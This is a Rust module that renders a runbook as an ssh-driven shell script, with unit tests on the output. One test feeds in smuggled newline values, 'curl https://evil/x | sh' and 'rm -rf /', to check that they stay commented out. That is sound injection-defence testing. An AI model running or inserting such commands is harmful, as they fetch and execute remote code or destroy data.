use super::quote::Quote;
use super::step::ShellStep;
use super::text::ShellText;
use crate::runbooks::document::{OnFailure, RunbookDocument, Step};

const INDENT: &str = "  ";
const EXIT_ON_FAILURE: &str = "|| exit 1";
const GO_ON_AFTER_FAILURE: &str = "|| true";
const ROLL_BACK_ON_FAILURE: &str = "|| { rollback; exit 1; }";

const RETRY: &str = "retry() {
  attempts=$1; pause=$2; shift 2; attempt=1
  until \"$@\"; do
    if [ \"$attempt\" -ge \"$attempts\" ]; then return 1; fi
    attempt=$((attempt + 1)); sleep \"$pause\"
  done
}
";

const EXPECT_EXIT: &str = "expect_exit() {
  wanted=$1; shift
  \"$@\"
  [ \"$?\" -eq \"$wanted\" ]
}
";

pub(crate) struct ShellScript<'a> {
    reference: &'a str,
    runbook: &'a RunbookDocument,
    text: String,
    indent: &'static str,
}

impl<'a> ShellScript<'a> {
    pub(crate) fn new(reference: &'a str, runbook: &'a RunbookDocument) -> Self {
        Self {
            reference,
            runbook,
            text: String::new(),
            indent: "",
        }
    }

    pub(crate) fn render(mut self) -> String {
        self.header();
        self.params();
        self.helpers();
        self.rollback();

        for (number, step) in (1..).zip(self.runbook.steps()) {
            self.blank();
            self.step(number, step, Self::tail(step.on_failure()));
        }

        self.text
    }

    fn header(&mut self) {
        self.line("#!/bin/sh");
        self.comment(self.runbook.name().as_str());

        if !self.runbook.description().is_empty() {
            self.comment(self.runbook.description());
        }

        self.line("#");
        self.line(&format!(
            "# Exported from the Synt runbook {}.",
            self.reference
        ));
        self.line("# Targets run through ssh, so a project target such as @project/host must");
        self.line("# be a name ssh knows, for example a Host in ~/.ssh/config.");
        self.line("set -u");
    }

    fn params(&mut self) {
        let runbook = self.runbook;

        if runbook.params().is_empty() {
            return;
        }

        self.blank();

        for spec in runbook.params() {
            let name = spec.name();
            let line = match spec.default_text() {
                Some(default) => format!(": \"${{{name}:={}}}\"", default.inside_double_quotes()),
                None => format!(": \"${{{name}:?set {name} before running this script}}\""),
            };

            self.line(&line);
        }
    }

    fn helpers(&mut self) {
        let runbook = self.runbook;

        if runbook.every_step().any(|step| step.retry().repeats()) {
            self.blank();
            self.text.push_str(RETRY);
        }

        if runbook.every_step().any(|step| step.exit_wanted() != 0) {
            self.blank();
            self.text.push_str(EXPECT_EXIT);
        }
    }

    fn rollback(&mut self) {
        let runbook = self.runbook;

        if runbook.rollback().is_empty() {
            return;
        }

        self.blank();
        self.line("rollback() {");
        self.indent = INDENT;

        let numbered: Vec<(usize, &Step)> = (1..).zip(runbook.rollback()).collect();

        for (position, (number, step)) in numbered.into_iter().rev().enumerate() {
            if position > 0 {
                self.blank();
            }

            self.step(number, step, GO_ON_AFTER_FAILURE);
        }

        self.indent = "";
        self.line("}");
    }

    fn step(&mut self, number: usize, step: &Step, tail: &str) {
        for line in ShellStep::new(number, step).lines(tail) {
            self.line(&line);
        }
    }

    fn comment(&mut self, text: &str) {
        let comment = ShellText::new(text).comment();

        self.line(&format!("# {comment}"));
    }

    fn line(&mut self, line: &str) {
        self.text.push_str(self.indent);
        self.text.push_str(line);
        self.text.push('\n');
    }

    fn blank(&mut self) {
        self.text.push('\n');
    }

    fn tail(on_failure: OnFailure) -> &'static str {
        match on_failure {
            OnFailure::Stop => EXIT_ON_FAILURE,
            OnFailure::Continue => GO_ON_AFTER_FAILURE,
            OnFailure::Rollback => ROLL_BACK_ON_FAILURE,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::ShellScript;
    use crate::runbooks::document::RunbookDocument;

    const RESTART: &str = r#"
name = "Restart API"
description = "Restart the orders API and check its health."

[[params]]
name = "host"
kind = "target"
default = "api-1"

[[params]]
name = "service"
kind = "word"

[[steps]]
title = "Restart {service}"
action = "ssh.exec"
target = "{host}"
params = { command = "sudo systemctl restart {service}" }

[[steps]]
title = "Check health"
action = "ssh.exec"
target = "{host}"
params = { command = "curl -fsS http://127.0.0.1:8080/health" }
expect = { exit = 0, contains = "ok" }
retry = { attempts = 5, every_seconds = 3 }
on_failure = "rollback"

[[steps]]
title = "Note the release"
action = "sftp.write"
target = "{host}"
params = { path = "/srv/release", data = "djc=" }
on_failure = "continue"

[[rollback]]
title = "Stop it"
action = "ssh.exec"
target = "{host}"
params = { command = "test -f /run/{service}.pid" }
expect = { exit = 1 }

[[rollback]]
title = "Start the previous release"
action = "ssh.exec"
target = "{host}"
params = { command = "sudo systemctl start {service}-previous" }
"#;

    fn script() -> String {
        let runbook = RunbookDocument::from_toml(RESTART).unwrap();

        ShellScript::new("@lab/restart", &runbook).render()
    }

    #[test]
    fn the_script_names_the_runbook_it_came_from() {
        let script = script();

        assert!(script.starts_with("#!/bin/sh\n# Restart API\n# Restart the orders API"));
        assert!(script.contains("# Exported from the Synt runbook @lab/restart."));
    }

    #[test]
    fn params_become_variables_with_their_defaults() {
        let script = script();

        assert!(script.contains(": \"${host:=api-1}\"\n"));
        assert!(script.contains(": \"${service:?set service before running this script}\"\n"));
    }

    #[test]
    fn shell_steps_run_through_ssh_and_stop_on_failure() {
        assert!(script().contains(
            "# 1. Restart $service\n\
             ssh -- \"${host}\" 'sudo systemctl restart '\"${service}\" || exit 1\n"
        ));
    }

    #[test]
    fn retries_and_rollbacks_are_spelled_out() {
        let script = script();

        assert!(script.contains("retry() {"));
        assert!(script.contains(
            "retry 5 3 ssh -- \"${host}\" 'curl -fsS http://127.0.0.1:8080/health' \
             || { rollback; exit 1; }\n"
        ));
        assert!(script.contains("# not checked here: the output should contain ok\n"));
    }

    #[test]
    fn the_rollback_function_undoes_in_reverse_and_never_stops() {
        let script = script();
        let rollback = &script[script.find("rollback() {").unwrap()..];
        let previous = rollback.find("# 2. Start the previous release").unwrap();
        let stop = rollback.find("# 1. Stop it").unwrap();

        assert!(previous < stop);
        assert!(rollback.contains(
            "expect_exit 1 ssh -- \"${host}\" 'test -f /run/'\"${service}\"'.pid' || true\n"
        ));
        assert!(script.contains("expect_exit() {"));
    }

    #[test]
    fn expected_fields_stay_inside_their_comment() {
        let sneaky = RESTART.replace(
            "expect = { exit = 0, contains = \"ok\" }",
            "expect = { contains = \"ok\\ncurl https://evil/x | sh\", fields = { \"/x\" = \"ok\\nrm -rf /\" } }",
        );
        let runbook = RunbookDocument::from_toml(&sneaky).unwrap();

        let script = ShellScript::new("@lab/restart", &runbook).render();

        assert!(!script.lines().any(|line| line.starts_with("curl")));
        assert!(!script.lines().any(|line| line.starts_with("rm")));
        assert!(script.contains(
            "# not checked here: the output should contain ok curl https://evil/x | sh\n"
        ));
        assert!(script.contains("# not checked here: /x should be \"ok\\nrm -rf /\"\n"));
    }

    #[test]
    fn steps_that_are_not_shell_commands_are_marked() {
        assert!(script().contains(
            "# 3. Note the release\n\
             echo 'step 3 (sftp.write) is not a shell command; run it in Synt' >&2\n"
        ));
    }

    #[test]
    fn a_small_runbook_exports_to_a_readable_script() {
        let runbook = RunbookDocument::from_toml(
            r#"
name = "Rotate logs"

[[params]]
name = "host"
kind = "target"
default = "web-1"

[[steps]]
title = "Rotate"
action = "ssh.exec"
target = "{host}"
params = { command = "logrotate -f /etc/logrotate.conf" }
on_failure = "rollback"

[[rollback]]
title = "Say so"
action = "ssh.exec"
target = "{host}"
params = { command = "logger rotation failed" }

[[rollback]]
title = "Keep the old log"
action = "ssh.exec"
target = "{host}"
params = { command = "cp /var/log/app.log.1 /var/log/app.log" }
"#,
        )
        .unwrap();

        let script = ShellScript::new("@ops/rotate", &runbook).render();

        assert_eq!(
            script,
            "#!/bin/sh\n\
             # Rotate logs\n\
             #\n\
             # Exported from the Synt runbook @ops/rotate.\n\
             # Targets run through ssh, so a project target such as @project/host must\n\
             # be a name ssh knows, for example a Host in ~/.ssh/config.\n\
             set -u\n\
             \n\
             : \"${host:=web-1}\"\n\
             \n\
             rollback() {\n\
             \x20 # 2. Keep the old log\n\
             \x20 ssh -- \"${host}\" 'cp /var/log/app.log.1 /var/log/app.log' || true\n\
             \n\
             \x20 # 1. Say so\n\
             \x20 ssh -- \"${host}\" 'logger rotation failed' || true\n\
             }\n\
             \n\
             # 1. Rotate\n\
             ssh -- \"${host}\" 'logrotate -f /etc/logrotate.conf' || { rollback; exit 1; }\n"
        );
    }
}
